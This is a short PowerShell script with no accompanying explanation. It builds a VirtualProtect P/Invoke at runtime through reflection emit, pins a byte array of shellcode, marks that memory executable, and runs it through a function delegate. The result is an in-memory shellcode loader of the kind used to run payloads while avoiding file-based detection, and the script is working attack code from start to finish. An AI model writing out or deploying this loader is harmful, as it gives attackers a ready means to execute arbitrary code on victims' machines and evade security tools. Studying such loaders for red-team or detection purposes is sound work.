# Create Dynamic Assembly

$Assembly = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object Reflection.AssemblyName('A')), 'Run')

# Create Module 

$Mod = $Assembly.DefineDynamicModule('A', $False)

# Create Types

$VAType = $Mod.DefineType("B", 'Public,BeforeFieldInit')
$DType = $Mod.DefineType('C', 'Public,Class,Sealed', [System.MulticastDelegate])

# Create Method

$Method = $VAType.DefineMethod('VirtualProtect', 'Public,Static,PinvokeImpl', ([Bool]), ([IntPtr],[IntPtr],[Int],[Int].MakeByRefType()))
$Method.DefineParameter(4, 'Out', $null)

# Augment with DllImportAttribute

$Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
$ImportAttrib = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor, 'kernel32', @(), @(), @([Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint')), @('VirtualProtect'))
$Method.SetCustomAttribute($ImportAttrib)

# Get Shellcode and pin it

$Addr = [System.Runtime.InteropServices.GCHandle]::Alloc($Shellcode,3).AddrOfPinnedObject()

# VirtualProtect it

$VAType.CreateType()::VirtualProtect($Addr, 4096, 0x20, [ref] 0)

# Prepare function delegate

$DType.DefineConstructor('RTSpecialName,HideBySig,Public', 'Standard', (New-Object Type[](0))).SetImplementationFlags('Runtime,Managed')
$DType.DefineMethod('Invoke', 'Public,HideBySig,NewSlot,Virtual', [IntPtr], (New-Object Type[](0))).SetImplementationFlags('Runtime,Managed')

# Invoke the shellcode

$ShellcodeDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($Addr, $DType.CreateType())
$ShellcodeDelegate.Invoke()